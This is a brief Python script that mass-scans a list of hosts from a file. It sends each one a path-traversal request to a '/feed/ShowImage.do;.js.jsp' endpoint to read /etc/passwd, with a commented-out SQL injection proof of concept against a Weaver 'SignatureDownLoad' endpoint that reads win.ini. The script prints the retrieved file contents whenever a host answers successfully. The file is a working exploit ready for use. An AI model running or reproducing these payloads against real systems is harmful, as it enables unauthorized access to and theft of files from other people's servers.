import requests

headers={
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
    "Accept-Language":"zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
    "Accept-Encoding": "gzip, deflate",
    "Upgrade-Insecure-Requests": 1
}
def scan(url:str,poc:str):
    url=url+poc
    print(url,end="")
    try:
        r=requests.get(url,headers=headers,timeout=10)
        if r.status_code==200:
            print("success"+url)
            print(r.text)
    except:
        print('not Find')

# poc="/weaver/weaver.file.SignatureDownLoad?markId=0%20union%20select%20%27C:/Windows/win.ini%27"
payload="/feed/ShowImage.do;.js.jsp?type=&imgName=../../../../../../../../../../../../../../../etc/passwd"
with open("host.txt","r",encoding="utf-8") as file:
    for url in file:
        if "http://" not in url and "https://" not in url:
            url="http://"+url
        scan(url=url.strip(),poc=payload)
